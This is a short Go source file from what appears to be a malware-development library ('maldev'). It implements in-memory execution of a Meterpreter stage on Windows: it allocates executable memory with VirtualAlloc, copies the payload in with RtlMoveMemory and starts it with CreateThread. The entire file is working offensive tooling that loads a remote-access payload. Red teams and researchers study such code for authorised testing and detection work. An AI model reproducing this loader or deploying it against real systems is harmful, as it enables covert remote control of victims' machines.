//go:build windows

package injection

import (
	"fmt"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	"golang.org/x/sys/windows"
)

// InjectMeterpreterWindows executes a Meterpreter stage in memory using
// VirtualAlloc + RtlMoveMemory + CreateThread.
func InjectMeterpreterWindows(stage []byte) error {
	if len(stage) == 0 {
		return fmt.Errorf("empty stage")
	}

	addr, err := windows.VirtualAlloc(
		0,
		uintptr(len(stage)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		return fmt.Errorf("VirtualAlloc: %w", err)
	}

	// Copy stage to allocated memory
	api.ProcRtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&stage[0])), uintptr(len(stage)))

	// Create thread to execute
	var threadID uint32
	thread, _, err := api.ProcCreateThread.Call(
		0, 0, addr, 0, 0, uintptr(unsafe.Pointer(&threadID)),
	)
	if thread == 0 {
		return fmt.Errorf("CreateThread: %w", err)
	}

	return nil
}
